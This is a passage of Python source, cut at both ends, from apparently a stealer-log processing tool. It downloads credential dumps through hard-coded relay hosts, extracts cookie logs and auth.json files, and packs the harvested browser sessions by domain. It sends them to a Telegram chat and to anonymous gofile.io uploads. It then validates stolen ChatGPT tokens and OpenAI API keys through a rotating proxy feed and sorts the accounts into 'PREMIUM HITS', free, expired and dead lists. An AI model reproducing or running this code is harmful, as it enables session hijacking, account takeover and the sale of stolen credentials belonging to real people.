        import urllib.parse
        clean_path = urllib.parse.unquote(url.split('?')[0].rstrip('/').split('/')[-1])
        out_name = clean_path if re.search(r'\.(zip|rar|7z|tar|gz)$', clean_path, re.I) else 'archive.bin'

    tgt = dest / out_name
    fd = os.open(str(tgt), os.O_RDWR | os.O_CREAT | os.O_TRUNC)

    if total_size > 0:
        try: os.posix_fallocate(fd, 0, total_size)
        except Exception:
            try: os.ftruncate(fd, total_size)
            except Exception: pass

    if range_supported and total_size > (4 * 1024 * 1024):
        is_internal = ("/dl/" in final_url) or ("trycloudflare.com" in final_url) or ("107.149.158.183" in final_url) or ("5.9.215.99" in final_url)
        # Internal (relay) links: many parallel connections. When the edge
        # in front of the relay throttles per connection, the number of
        # connections is what decides the total speed. The edge also caps
        # how many connections it will carry at once, so the total (files
        # in parallel x connections per file) has to stay below that.
        try:
            workers = int(os.environ.get("RELAY_SPLITS") or "")
        except Exception:
            workers = 0
        if workers <= 0:
            workers = 96 if is_internal else min(16, max(4, (os.cpu_count() or 4) * 2))
        # The segment size is independent of the number of connections.
        #
        # One segment per connection (file_size / connections) is the fastest
        # shape: the relay pipelines the chunks of a request and keeps the
        # connection busy, and a connection is only opened once. Smaller
        # segments mean more requests and more per-request overhead, and the
        # measured aggregate drops with it - 8 MB segments moved 2.32 GB in
        # the first twelve minutes where 125 MB segments moved 5.81 GB.
        #
        # The queue is kept regardless, so a connection that finishes early
        # picks up the next segment instead of idling.
        try:
            seg_mb = int(os.environ.get("RELAY_SEGMENT_MB") or "")
        except Exception:
            seg_mb = 0
        if seg_mb > 0:
            seg_size = seg_mb * 1024 * 1024
        else:
            seg_size = max(1, total_size // workers)
        downloaded = [0]
        lock = threading.Lock()
        last_tick = [time.time()]
        last_done = [0.0]

        # The segments every connection works through, in order.
        seg_queue = queue.Queue()
        off = 0
        while off < total_size:
            seg_end = min(off + seg_size, total_size) - 1
            seg_queue.put((off, seg_end))
            off = seg_end + 1
        seg_total = seg_queue.qsize()

        def fetch_segment(w_idx, start, end):
            """Fetch one segment, resuming from where it stopped.

            A segment that ends early must never be silently accepted: the
            file is preallocated to its full length, so the bytes that were
            never written stay as zeros and the scan that follows sees a
            file with holes in it. Every early end is therefore retried from
            the last byte that actually arrived, and the segment is only
            complete when the last byte is there.
            """
            curr = start
            attempts = 0
            while curr <= end:
                attempts += 1
                if attempts > 20:
                    break
                if stop(): return False
                try:
                    w_req = urllib.request.Request(final_url, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                        'Range': f'bytes={curr}-{end}',
                        'Accept': '*/*'
                    })
                    with urllib.request.urlopen(w_req, timeout=180) as r:
                        while curr <= end:
                            if stop(): return False
                            chunk = r.read(1024 * 1024)
                            if not chunk:
                                # The stream ended early. Break out and retry
                                # from the last byte that arrived.
                                break
                            os.pwrite(fd, chunk, curr)
                            curr += len(chunk)
                            with lock:
                                downloaded[0] += len(chunk)
                                done = downloaded[0]
                                if progress_cb is not None:
                                    progress_cb(len(chunk))
                                    continue
                                now_t = time.time()
                                if now_t - last_tick[0] >= 2.0:
                                    # Rate over the last tick, not since the
                                    # start: a cumulative average reads far
                                    # below the speed the link is running at.
                                    spd = fs((done - last_done[0]) / (now_t - last_tick[0])) + "/s" \
                                        if now_t > last_tick[0] else "-"
                                    last_done[0] = done
                                    last_tick[0] = now_t
                                    pct_dl = 4 + int(done * 26 // total_size)
                                    el = now_t - t0
                                    st("download", pct_dl, got=fs(done),
                                       total=fs(total_size), speed=spd,
                                       elapsed=ft(el), file=out_name, size=total_size)
                except Exception:
                    pass
                # Either the stream ended early or the request failed: the
                # segment is incomplete, so resume it from where it stopped.
                time.sleep(min(0.5 * attempts, 5))
            return curr > end

        def worker_loop(w_idx):
            """One connection works through the segments until they are gone."""
            bad = 0
            while True:
                try:
                    start, end = seg_queue.get_nowait()
                except queue.Empty:
                    return bad == 0
                if not fetch_segment(w_idx, start, end):
                    bad += 1
                seg_queue.task_done()

        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(worker_loop, i) for i in range(workers)]
            incomplete = []
            for f in concurrent.futures.as_completed(futs):
                if stop():
                    os.close(fd); return None
                try:
                    if not f.result():
                        incomplete.append(1)
                except Exception:
                    incomplete.append(1)
            if incomplete:
                # The file is the right size on disk but parts of it were
                # never written. Scanning it would report panels that are
                # simply not in the dump, so the download is a failure.
                sys.stdout.write("INCOMPLETE DOWNLOAD: %d of %d connections did not "
                                 "finish (%d of %d bytes written, %d segments)\n"
                                 % (len(incomplete), workers, downloaded[0], total_size, seg_total))
                sys.stdout.flush()
                os.close(fd)
                return None
    else:
        # High-speed buffered stream fallback (2MB buffer)
        req = urllib.request.Request(final_url, headers={'User-Agent': 'Mozilla/5.0'})
        written = 0
        with urllib.request.urlopen(req, timeout=900) as r:
            curr = 0
            last_tick = time.time()
            while True:
                if stop():
                    os.close(fd); return None
                chunk = r.read(2 * 1024 * 1024)
                if not chunk: break
                os.write(fd, chunk)
                curr += len(chunk)
                written += len(chunk)
                if progress_cb is not None:
                    progress_cb(len(chunk))
                    continue
                now_t = time.time()
                if now_t - last_tick >= 2.0:
                    last_tick = now_t
                    pct_dl = 4 + (curr * 26 // total_size if total_size else 0)
                    el = now_t - t0
                    spd = fs(curr / el) + "/s" if el > 0 else "-"
                    st("download", pct_dl, got=fs(curr),
                       total=fs(total_size) if total_size else "?", speed=spd,
                       elapsed=ft(el), file=out_name, size=total_size)
        if total_size and written != total_size:
            sys.stdout.write("INCOMPLETE DOWNLOAD: %d of %d bytes written\n"
                             % (written, total_size))
            sys.stdout.flush()
            os.close(fd)
            return None

    os.close(fd)
    return str(tgt)

# ── 2. extract (all cores; tries every supplied password, never re-downloads) ──
def atype(p):
    try:
        with open(p, "rb") as f: mg = f.read(8)
        if mg.startswith(b"Rar!\x1a\x07"): return "rar"
        if mg.startswith(b"PK\x03\x04"): return "zip"
    except Exception: pass
    return "rar" if Path(p).suffix.lower() in (".rar", ".r00") else "zip"

FILTERS = ("*.txt", "*.log", "*.cookie", "*.cookies", "auth.json", "Auth.json")

def nfiles(tool, arc, pwd, filters=None):
    try:
        name = os.path.basename(tool)
        if "unrar" in name:
            c = [tool, "lb", "-p%s" % pwd if pwd else "-p-", str(arc)]
        else:
            c = [tool, "l", str(arc)] + (["-p%s" % pwd] if pwd else [])
            if filters:
                c += ["-i!" + f for f in filters]
        ls = [l for l in run(c).stdout.splitlines() if l.strip()]
        return sum(1 for l in ls if re.search(r"\d{4}-\d{2}-\d{2}", l)) or len(ls) or 1
    except Exception: return 1

def dstat(p):
    fl = [f for f in Path(p).rglob("*") if f.is_file()]
    return len(fl), sum(f.stat().st_size for f in fl)

def extract(arc, out, pwds):
    """Only text files can contain cookies, so extract them first with an include
    filter (far less I/O on mixed archives); fall back to a full extract."""
    ok, why = _extract(arc, out, pwds, FILTERS)
    if not ok and why not in ("wrong_password", "cancelled"):
        ok, why = _extract(arc, out, pwds, None)
    return ok, why

def _extract(arc, out, pwds, filters):
    out.mkdir(parents=True, exist_ok=True)
    t = atype(arc)
    if not any(shutil.which(x) for x in ("7zz", "7z", "7za")): apt(["p7zip-full"])
    if t == "rar" and not any(shutil.which(x) for x in ("unrar", "unrar-free", "unar")):
        apt(["unrar-free"])
    # 7zz (7-Zip 23+) decodes RAR5 and is much faster than unrar-free; unar and
    # unrar stay as fallbacks for archives 7-Zip rejects.
    order = (["7zz", "7z", "7za", "unrar", "unrar-free", "unar"] if t == "rar"
             else ["7zz", "7z", "7za", "unar", "unrar", "unrar-free"])
    tools = [p for p in (shutil.which(x) for x in order) if p]
    if not tools:
        st("error", err="no_extractor_on_vm"); return False, "tool_missing"
    badpwd = False
    for tool in tools:
        tot = nfiles(tool, arc, (pwds or [None])[0], filters)
        for pwd in (pwds or [None]):
            if stop(): return False, "cancelled"
            name = os.path.basename(tool)
            if "unrar" in name:
                cmd = [tool, "x", "-o+", "-y", "-p%s" % pwd if pwd else "-p-",
                       str(arc), str(out).rstrip("/") + "/"]
            elif name == "unar":
                cmd = [tool, "-f", "-D", "-o", str(out), str(arc)]
            else:
                cmd = [tool, "x", str(arc), "-o%s" % out, "-y", "-mmt=%d" % CORES]
                if pwd: cmd.append("-p%s" % pwd)
                if filters:
                    cmd += ["-ir!" + f for f in filters]
            st("extract", 31, engine=os.path.basename(tool), files_total=tot,
               using_password=bool(pwd), threads=CORES, last_file="")
            t0 = time.time()
            # stderr merged into stdout: an undrained stderr pipe deadlocks the
            # extractor once it warns on 64 KB, which froze big archives mid-run.
            pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                  stdin=subprocess.DEVNULL, text=True,
                                  errors="ignore", bufsize=1)
            done = 0
            sz = 0
            sz_t = 0.0
            tail = []
            act = [time.time()]
            base_free = shutil.disk_usage(str(out)).free

            def watch(proc=pr, act=act):
                last_free = shutil.disk_usage(str(out)).free
                while proc.poll() is None:
                    time.sleep(10)
                    try:
                        cur = shutil.disk_usage(str(out)).free
                    except Exception:
                        continue
                    if cur < last_free - (1 << 20):
                        last_free, act[0] = cur, time.time()
                    elif time.time() - act[0] > 600:
                        proc.kill()
                        return
            threading.Thread(target=watch, daemon=True).start()

            rx = re.compile(r"^(Extracting|-\s+\S|x\s+\S)", re.I)
            for raw in pr.stdout:
                if stop():
                    pr.kill(); return False, "cancelled"
                line = raw.strip()
                tail.append(line)
                if len(tail) > 200: tail.pop(0)
                if rx.search(line):
                    done += 1
                    act[0] = time.time()
                    el = time.time() - t0
                    rate = done / el if el > 0 else 0
                    eta = (tot - done) / rate if rate > 0 else 0
                    if time.time() - sz_t >= 2.0:
                        sz_t = time.time()
                        try: sz = max(0, base_free - shutil.disk_usage(str(out)).free)
                        except Exception: pass
                    nm = line.split()[-1] if line else ""
                    tick("extract", 31 + min(done * 12 // max(tot, 1), 12),
                         files=done, files_total=tot, extracted=fs(sz),
                         ex_speed=fs(sz / el) + "/s" if el > 0 else "-",
                         file_speed="%d f/s" % rate if rate else "-",
                         eta=ft(eta), elapsed=ft(el), last_file=Path(nm).name[:40],
                         core_load=os.getloadavg()[0] if hasattr(os, "getloadavg") else 0)
            pr.wait()
            out_txt = "\n".join(tail).lower()
            if pr.returncode == 11 or any(k in out_txt for k in
                   ("wrong password", "bad password", "corrupt file or wrong password",
                    "data error in encrypted", "enter password")):
                badpwd = True
                st("wrong_password", 31, tried=str(pwd)); continue
            n, sz = dstat(out)
            if pr.returncode in (0, 1) and n:
                st("extracted", 43, files=n, extracted=fs(sz), ex_time=ft(time.time() - t0))
                return True, "ok"
    return False, ("wrong_password" if badpwd else "corrupt")

# ── 3. cookie search on every core + packaging ──
def search_pack(ex, want_auth=True):
    """One tree walk collects both scan targets: cookie logs and auth.json."""
    files, auths = [], []
    for p in ex.rglob("*"):
        try:
            if not p.is_file(): continue
        except OSError:
            continue
        n = p.name.lower()
        if n == "auth.json":
            if want_auth:
                auths.append(p)
        elif n.endswith((".txt", ".log", ".cookie", ".cookies")):
            files.append(str(p))
    tot = len(files)
    st("scan", 44, log_files=tot, cores=CORES,
       auth=len(auths) if want_auth else None)
    sess = {d: [] for d in DOMS}; seen = {d: set() for d in DOMS}
    if tot:
        size = 256          # small chunks: progress + cancellation stay live on huge trees
        chunks = [files[i:i + size] for i in range(0, tot, size)]
        # parsing is I/O bound, so oversubscribe the cores (2× vCPU, min 4)
        nw = min(len(chunks), max(4, CORES * 2))
        mp_ctx = multiprocessing.get_context("fork")
        with ProcessPoolExecutor(max_workers=nw, mp_context=mp_ctx) as ex_pool:
            futs = [ex_pool.submit(scan_chunk, c) for c in chunks]
            scanned = found_c = 0
            for fut in as_completed(futs):
                for per_file in fut.result():
                    scanned += 1
                    if stop(): return {}, []
                    for d, items in per_file.items():
                        sig = tuple(sorted((n, v) for n, v, _ in items))
                        if not sig or sig in seen[d]: continue
                        seen[d].add(sig)
                        sess[d].append([fmt for _n, _v, fmt in items])
                        found_c += 1
                tick("scan", 44 + min(scanned * 40 // max(tot, 1), 40),
                     scanned=scanned, log_files=tot, cores=CORES,
                     workers=nw, sessions=found_c,
                     auth=len(auths) if want_auth else None,
                     per_domain={d: len(v) for d, v in sess.items() if v})
    hdr = "# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n\n"
    packed = {}
    for d, sessions_ in sess.items():
        if not sessions_: continue
        pack_domain(d, sessions_, hdr)
        packed[d] = len(sessions_)
    st("packed", 92, found=packed,
       auth=len(auths) if want_auth else None)
    return packed, auths

def pack_auth(auths):
    """All auth.json files in one auth.zip, renamed 1st_auth.json, 2nd_auth.json…"""
    if not auths: return None, []
    zp = OUT / "auth.zip"
    rels = []
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
        for i, p in enumerate(auths, 1):
            name = "%s_auth.json" % ordn(i)
            try: rel = str(p.relative_to(WORK / "ex"))
            except Exception: rel = p.name
            rels.append((name, rel))
            try: z.write(str(p), name)
            except Exception: pass
    return zp, rels

def ordn(n):
    suf = "th" if 10 <= n % 100 <= 20 else {1: "st", 2: "nd", 3: "rd"}.get(n % 10, "th")
    return "%d%s" % (n, suf)

def pack_domain(dom, sessions_, hdr):
    """One zip per domain, split into parts under Telegram's 50 MB upload cap.
    The cap applies to the compressed file, which is always <= the text size,
    so a 45 MB raw limit per part is safe."""
    LIMIT = 45 << 20
    base = re.sub(r"[^\w.-]", "_", dom.lower())
    for old in OUT.glob(base + "*.zip"):
        try: old.unlink()
        except Exception: pass
    part, cur, raw = 0, None, 0
    for i, session_lines in enumerate(sessions_, 1):
        blob = hdr + "\n".join(session_lines) + "\n"
        if cur is None:
            part += 1
            name = OUT / ("%s.zip" % base if part == 1
                          else "%s.part%d.zip" % (base, part))
            cur, raw = zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED), 0
        cur.writestr("%d.txt" % i, blob)
        raw += len(blob)
        if raw >= LIMIT:
            cur.close(); cur = None
    if cur:
        cur.close()
    if part > 1:
        full = OUT / ("%s.full.zip" % base)
        with zipfile.ZipFile(full, "w", zipfile.ZIP_DEFLATED) as z:
            for i, session_lines in enumerate(sessions_, 1):
                z.writestr("%d.txt" % i, hdr + "\n".join(session_lines) + "\n")

def gofile(path):
    """Anonymous gofile.io upload; returns the download page for a full zip."""
    try:
        srv = (requests.get("https://api.gofile.io/servers", timeout=30).json()
               .get("data", {}).get("servers") or [])
    except Exception as e:
        sys.stdout.write("gofile servers: %s\n" % e); return None
    for s in srv[:3]:
        try:
            with open(path, "rb") as fh:
                r = requests.post("https://%s.gofile.io/contents/uploadfile"
                                  % s.get("name"),
                                  files={"file": (os.path.basename(path), fh)},
                                  timeout=1800)
            d = r.json()
            if d.get("status") == "ok":
                return (d.get("data") or {}).get("downloadPage")
            sys.stdout.write("gofile %s: %s\n" % (s.get("name"), str(d)[:160]))
        except Exception as e:
            sys.stdout.write("gofile %s error: %s\n" % (s.get("name"), e))
    return None

SPECS = {}
Q = queue.Queue()
TG_CAP = 45 << 20          # stays clear of Telegram's 50 MB bot upload limit

def split_zip(zp):
    """Roll an oversized zip into <name>.partN.zip files, each a valid archive on
    its own. Entries are copied whole (STORED — re-deflating an already packed
    inner zip buys nothing and burns a core), and found_in.txt is repeated in
    every part so no part loses its manifest."""
    idx, raw, cur = 0, 0, None
    with zipfile.ZipFile(zp) as src:
        infos = [i for i in src.infolist() if not i.is_dir()]
        man = next((i for i in infos if i.filename.lower() == "found_in.txt"), None)
        blob_man = src.read(man) if man else None
        for inf in infos:
            if inf is man:
                continue
            blob = src.read(inf)
            if cur is not None and raw + len(blob) > TG_CAP:
                cur.close(); cur = None
            if cur is None:
                idx += 1
                cur = zipfile.ZipFile(OUT / ("%s.part%d.zip" % (zp.stem, idx)),
                                      "w", zipfile.ZIP_STORED)
                raw = 0
                if blob_man is not None:
                    cur.writestr(man.filename, blob_man)
            cur.writestr(inf, blob, zipfile.ZIP_STORED)
            raw += len(blob)
            if raw > TG_CAP:                 # one entry alone breaks the cap
                sys.stdout.write("part %d holds a %s entry that is too big for "
                                 "Telegram on its own\n" % (idx, fs(raw)))
                sys.stdout.flush()
        if cur is not None:
            cur.close()
    return [p for p in (OUT / ("%s.part%d.zip" % (zp.stem, i)) for i in range(1, idx + 1))
            if p.exists() and p.stat().st_size > 0]

def ship(zp, cap):
    """Send one result zip. Telegram-sized files go whole; anything bigger is
    split into parts and the complete archive is handed over as a gofile link —
    nobody wants to re-join parts by hand. cap(size, idx, count, total, split)
    builds the caption. Returns (parts sent, full-zip link or None)."""
    tot = zp.stat().st_size if zp.exists() else 0
    if not tot:
        return 0, None
    if tot <= TG_CAP:
        return (1 if upload(str(zp), cap(tot, 1, 1, tot, False)) else 0), None
    parts = split_zip(zp)
    sent = sum(1 for i, p in enumerate(parts, 1)
               if upload(str(p), cap(p.stat().st_size, i, len(parts), tot, True)))
    if not sent:
        return 0, None
    url = gofile(str(zp))
    if not url:
        sys.stdout.write("gofile link for %s failed\n" % zp.name); sys.stdout.flush()
    for p in parts:
        try: p.unlink()
        except Exception: pass
    return sent, url

def ship_note(idx, count, size, tot, split, label):
    """Shared size / part line for every shipped archive."""
    if split:
        return (f"📦 {bold('Part')}    {code(idx)} / {code(count)}\n"
                f"✂️ {bold('Split')}   {code(fs(tot))} broke Telegram's 50 MB cap — "
                f"the whole {code(label)} rides on the link below\n")
    return f"📦 {bold('Size')}   {code(fs(size))}\n"

def deliver(packed, task):
    """Post every domain zip (and each part of a split domain) to the chat.
    A domain that had to be split also gets its combined zip on gofile."""
    sent, failed, links = [], [], {}
    for dom, cnt in (packed or {}).items():
        base = re.sub(r"[^\w.-]", "_", dom.lower())
        parts = sorted(p for p in OUT.glob(base + "*.zip")
                       if re.fullmatch(re.escape(base) + r"(\.part\d+)?\.zip", p.name))
        if not parts:
            failed.append(dom)
            continue
        ok_all = True
        for zp in parts:
            tot = sum(p.stat().st_size for p in parts)
            cap = (f"{gold_header('COOKIES READY', esc(dom))}\n{THIN}\n"
                   f"🍪 {bold('Sessions')}  {code(cnt)}\n"
                   f"📦 {bold('Size')}      {code(fmt_size(zp.stat().st_size))}"
                   + (f" of {code(fmt_size(tot))} total" if len(parts) > 1 else "") + "\n"
                   f"🗂 {bold('Part')}      {code(parts.index(zp) + 1)} / {code(len(parts))}\n"
                   f"📄 {bold('Layout')}    numbered .txt at zip root\n"
                   f"⏱ {bold('Job time')}  {code(fmt_time(time.time() - (PB[2] or time.time())))}\n"
                   f"🖥 {bold('VM')}        {code(SPECS.get('cores', '?'))} vCPU · "
                   f"{code(SPECS.get('ram', '?'))}")
            if not upload(str(zp), cap):
                ok_all = False
        (sent if ok_all else failed).append(dom)
        if len(parts) > 1:
            full = OUT / ("%s.full.zip" % base)
            if full.exists():
                url = gofile(str(full))
                if url:
                    links[dom] = url
                else:
                    sys.stdout.write("full-zip link failed for %s\n" % dom)
    return sent, failed, links

def deliver_auth(auths):
    """Send auth.zip (1st_auth.json, 2nd_auth.json…) to the chat.
    Returns (sent, file_id) — the file id lets the bot re-download this exact
    archive and run the proxy check on it after the job ends."""
    zp, rels = pack_auth(auths)
    if zp is None:
        return False, None
    shown = "\n".join(code("%s ← %s" % (n, r[:58])) for n, r in rels[:10])
    size_line = f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
    cap = (f"{gold_header('AUTH.JSON FILES', esc(str(len(auths)) + ' found'))}\n{THIN}\n"
           + size_line
           + f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
           + shown
           + ("\n…" if len(rels) > 10 else ""))
    if not TG or not CHAT:
        return False, None
    if zp.stat().st_size > TG_CAP:
        def auth_cap(size, idx, count, tot, split):
            return (cap.replace(size_line, "") + "\n"
                    + ship_note(idx, count, size, tot, split, "auth.zip")
                    + f"🔎 {bold('Re-check')}  parts cannot be re-downloaded as one "
                      f"archive, so the bot-side proxy check is skipped for this job")
        sent_parts, _ = ship(zp, auth_cap)
        return sent_parts > 0, None
    last = None
    for attempt in range(5):
        try:
            with open(zp, "rb") as fh:
                r = tg_post(TG_API + "sendDocument", tries=1,
                            data={"chat_id": CHAT, "caption": cap,
                                  "parse_mode": "HTML"},
                            files={"document": (zp.name, fh)}, timeout=300)
            if r is not None and r.status_code == 200:
                fid = (((r.json().get("result") or {}).get("document") or {})
                       .get("file_id"))
                return True, fid
            last = r
            sys.stdout.write("tg send %s: %s (attempt %d/5)\n"
                             % (zp.name, getattr(r, "text", r)[:200], attempt + 1))
            sys.stdout.flush()
        except Exception as e:
            last = e
            sys.stdout.write("tg send error: %s (attempt %d/5)\n" % (e, attempt + 1))
            sys.stdout.flush()
        time.sleep(min(5 * (attempt + 1), 25))
        return False, None

# ── auth.json proxy check (did the user request it in step 4?) ─────────────
AUTH_PROXY_URL   = "https://etherealproxyfetch.onrender.com/live.txt"
AUTH_PREMIUM     = ("plus", "pro", "team", "enterprise", "go")

def auth_fetch_proxies():
    """Live proxy lines from the feed; [] means checks try the direct route."""
    try:
        r = requests.get(AUTH_PROXY_URL, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code == 200:
            out = []
            for l in r.text.splitlines():
                p = l.strip()
                if not p or p.startswith("#"): continue
                out.append(p if "://" in p else "http://" + p)
            if out:
                return out
    except Exception as e:
        sys.stdout.write("auth proxies: %s\n" % e); sys.stdout.flush()
    return []

def auth_jwt(tok):
    import base64
    try:
        p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p).decode("utf-8"))
    except Exception:
        return {}

def auth_check_one(rel, path, proxy):
    res = {"name": rel, "status": "dead", "reason": "", "email": "-",
           "plan": "-", "expires": "-", "proxy": proxy or "direct", "token": ""}
    try:
        data = json.load(open(path, encoding="utf-8-sig", errors="ignore"))
    except Exception as e:
        res["reason"] = "invalid json: %s" % str(e)[:40]; return res
    if not isinstance(data, dict):
        res["reason"] = "not a json object"; return res
    tokens = data.get("tokens") if isinstance(data.get("tokens"), dict) else {}
    access = tokens.get("access_token") or ""
    idt = tokens.get("id_token") or ""
    ak = data.get("OPENAI_API_KEY") or ""
    px = ({"http": proxy, "https": proxy} if proxy else None)
    H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Accept": "application/json"}
    if not access and str(ak).startswith("sk-"):
        res.update(token=ak, plan="API")
        try:
            r = requests.get("https://api.openai.com/v1/models",
                             headers=dict(H, Authorization="Bearer " + ak),
                             proxies=px, timeout=20)
            res["reason"] = "HTTP %s" % r.status_code
            res["status"] = ("api" if r.status_code == 200 else
                             "dead" if r.status_code == 401 else "error")
        except Exception as e:
            res.update(status="error", reason="net: %s" % str(e)[:30])
        return res
    if not access or not idt:
        res["reason"] = "missing access_token / id_token"; return res
    res["token"] = access
    payload = auth_jwt(idt)
    res["email"] = payload.get("email", "Unknown")
    ai = payload.get("https://api.openai.com/auth") or {}
    res["plan"] = str(ai.get("chatgpt_plan_type", "Free") or "Free")
    until = str(ai.get("chatgpt_subscription_active_until", "-") or "-")
    if "T" in until: until = until.split("T")[0]
    res["expires"] = until
    exp = None
    try: exp = float(auth_jwt(access).get("exp"))
    except Exception: pass
    if exp and exp < time.time():
        res.update(status="expired",
                   reason="jwt expired %s" % time.strftime("%Y-%m-%d", time.gmtime(exp)))
        return res
    try:
        r = requests.get("https://chatgpt.com/backend-api/me",
                         headers=dict(H, Authorization="Bearer " + access),
                         proxies=px, timeout=25)
        res["reason"] = "HTTP %s" % r.status_code
        res["status"] = ("live" if r.status_code == 200 else
                         "expired" if r.status_code == 401 else "error")
    except Exception as e:
        res.update(status="error", reason="net: %s" % str(e)[:30])
    return res

def check_auths(auths):
    """Check every found auth.json (15 threads, live card). Writes the result
    files, uploads auth_report.zip and returns ck_* counts for the payload."""
    from concurrent.futures import ThreadPoolExecutor
    total = len(auths)
    tick("authcheck", 93, auth_total=total, checked=0, live=0, expired=0,
         dead=0, err=0, proxies=0)
    proxies = auth_fetch_proxies()
    if stop():
        return {}

    # search_pack() hands back bare paths; accept (rel, path) pairs too
    pairs = []
    for it in auths:
        if isinstance(it, (tuple, list)):
            pairs.append((str(it[0]), str(it[1])))
            continue
        p = it
        try:
            rel = str(p.relative_to(WORK / "ex"))
        except Exception:
            rel = p.name
        pairs.append((rel, str(p)))
    total = len(pairs)
    results = [None] * total
    MAX_TRY = 3

    def run_pass(pending, seed):
        """One check pass over the pending indexes; False when cancelled.
        The last pass always drops the proxies and tries the direct route."""
        def one(i):
            rel, path = pairs[i]
            proxy = None
            if proxies and seed < MAX_TRY - 1:
                proxy = proxies[(seed * 7919 + i) % len(proxies)]
            try:
                return auth_check_one(rel, path, proxy)
            except Exception as e:
                return {"name": rel, "status": "error", "reason": "thread: %s" % e,
                        "email": "-", "plan": "-", "expires": "-",
                        "proxy": proxy or "direct", "token": ""}
        with ThreadPoolExecutor(max_workers=min(15, max(1, len(pending)))) as exr:
            for j, res in enumerate(exr.map(one, pending)):
                if stop():
                    return False
                results[pending[j]] = res
                done_list = [r for r in results if r is not None]
                lv_n = sum(1 for r in done_list if r["status"] in ("live", "api"))
                pm_n = sum(1 for r in done_list if r["status"] == "live"
                           and r["plan"].lower() in AUTH_PREMIUM)
                tick("authcheck", 93 + min(len(done_list) * 5 // max(total, 1), 5),
                     auth_total=total, checked=len(done_list), live=lv_n,
                     expired=sum(1 for r in done_list if r["status"] == "expired"),
                     dead=sum(1 for r in done_list if r["status"] == "dead"),
                     err=sum(1 for r in done_list if r["status"] == "error"),
                     prem=pm_n, free=lv_n, proxies=len(proxies) or 1,
                     rechecking=len(pending))
        return True

    pending = list(range(total))
    for round_n in range(MAX_TRY):
        if not pending:
            break
        if not run_pass(pending, round_n):
            return {}
        pending = [i for i in range(total)
                   if results[i] and results[i]["status"] == "error"]
    for i, r in enumerate(results):
        # leftovers after all rounds: classify as unreachable-BAD, no ERROR bucket
        if r is None:
            r = {"name": pairs[i][0], "status": "dead", "reason": "no result",
                 "email": "-", "plan": "-", "expires": "-", "proxy": "-", "token": ""}
        elif r.get("status") == "error":
            r["status"] = "dead"
            r["reason"] = ("unreachable after %d attempts (%s)"
                           % (MAX_TRY, r.get("reason", "")))
        results[i] = r

    def aline(r):
        return ("File: %s\nEmail: %s | Plan: %s | Exp: %s\n"
                % (r["name"], r["email"], r["plan"], r["expires"])
                + ("Token: %s\n" % r["token"] if r["token"] else "")
                + ("Status: %s | %s\nProxy: %s\n%s\n"
                   % (r["status"], r["reason"], r["proxy"], "-" * 48)))
    prem_set = [r for r in results if r["status"] == "live"
                and r["plan"].lower() in AUTH_PREMIUM]
    free_set = [r for r in results if r["status"] in ("live", "api")
                and r["plan"].lower() not in AUTH_PREMIUM]
    exp_set  = [r for r in results if r["status"] == "expired"]
    dead_set = [r for r in results if r["status"] == "dead"]
    err_set  = [r for r in results if r["status"] == "error"]
    live_set = prem_set + free_set
    src_by_name = {rel: path for rel, path in pairs}
    num_of = {rel: n for n, (rel, _p) in enumerate(pairs, 1)}

    def wfile(name, rows, head=""):
        (OUT / "results").mkdir(parents=True, exist_ok=True)
        with open(OUT / name, "w", encoding="utf-8") as f:
            f.write(head)
            for r in rows: f.write(aline(r))

    wfile("results/premium_hits.txt", prem_set,
          head=("==================================================\n   PREMIUM HITS\n"
                "==================================================\n\n") if prem_set else "")
    wfile("results/free_hits.txt", free_set)
    wfile("results/expired.txt", exp_set)
    wfile("results/dead.txt", dead_set)
    wfile("results/errors.txt", err_set)

    # ── bucket folders: PAID / FREE / EXPIRED / BAD / ERROR ──
    # each holds the real auth.json copies, renamed paid_1st_auth.json …
    PREFIX = {"PAID": "paid", "FREE": "free", "EXPIRED": "expired",
              "BAD": "bad", "ERROR": "error"}
    fold_of = {"PAID": prem_set, "FREE": free_set, "EXPIRED": exp_set,
               "BAD": dead_set, "ERROR": err_set}
    _sh = shutil
    try:
        (OUT / "results").mkdir(parents=True, exist_ok=True)
        for fold, rows in fold_of.items():
            if not rows:
                continue          # skip empty buckets — no empty folders in the zip
            d = OUT / "results" / fold
            d.mkdir(parents=True, exist_ok=True)
            hits = ""
            for r in rows:
                num = num_of.get(r["name"], 1)
                try:
                    _sh.copy(src_by_name[r["name"]],
                             str(d / ("%s_%s_auth.json" % (PREFIX[fold], ordn(num)))))
                except Exception:
                    pass
                hits += aline(r)
            with open(d / "hits.txt", "w", encoding="utf-8") as f:
                f.write(hits)
    except Exception as e:
        sys.stdout.write("auth folders: %s\n" % e); sys.stdout.flush()
    try:
        with open(OUT / "results/all_results.json", "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False)
        with open(OUT / "results/proxies_used.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(proxies) + "\n")
    except Exception as e:
        sys.stdout.write("auth result files: %s\n" % e); sys.stdout.flush()

    report = (
        "==================================================\n   AUTH CHECKER REPORT\n"
        "   %s\n" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) +
        "==================================================\n\n"
        "Total auth files     : %d\n" % total +
        "Proxies loaded       : %d\n" % len(proxies) +
        "Attempts per file    : up to %d (errors re-checked)\n\n" % MAX_TRY +
        "Valid tokens         : %d\n" % len(live_set) +
        "  PAID (Plus/Pro/…)  : %d\n" % len(prem_set) +
        "  FREE               : %d\n" % len(free_set) +
        "Expired tokens       : %d\n" % len(exp_set) +
        "Dead / invalid (BAD) : %d\n" % len(dead_set) +
        "Check errors (ERROR) : %d\n\n" % len(err_set) +
        "Live accounts        : %d (paid %d, free %d)\n"
        % (len(live_set), len(prem_set), len(free_set)) +
